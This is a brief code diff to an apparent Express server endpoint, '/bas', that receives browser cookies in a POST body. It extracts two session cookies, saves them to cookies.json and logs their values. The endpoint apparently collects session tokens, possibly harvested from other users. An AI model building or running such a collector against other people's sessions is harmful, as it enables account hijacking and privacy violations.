@@ -25,9 +25,12 @@ app.post("/bas", async (req, res) => {
     const sbstc_ss = req.body.cookies.find(e => e.name === 'sbstc_ss')?.value;
     let cookies = require('./cookies.json');
     if (!cookies.find(e => e.sbits_session === sbits_session)) {
-        cookies.push({ sbits_session, sbstc_ss })
-        fs.writeFileSync('cookies.json', JSON.stringify(cookies))
-        console.log(cookies.length);
+        if (sbits_session) {
+            cookies.push({ sbits_session, sbstc_ss })
+            fs.writeFileSync('cookies.json', JSON.stringify(cookies))
+            console.log({ sbits_session, sbstc_ss })
+            console.log(cookies.length);
+        }
     }
     res.sendStatus(200);
 });
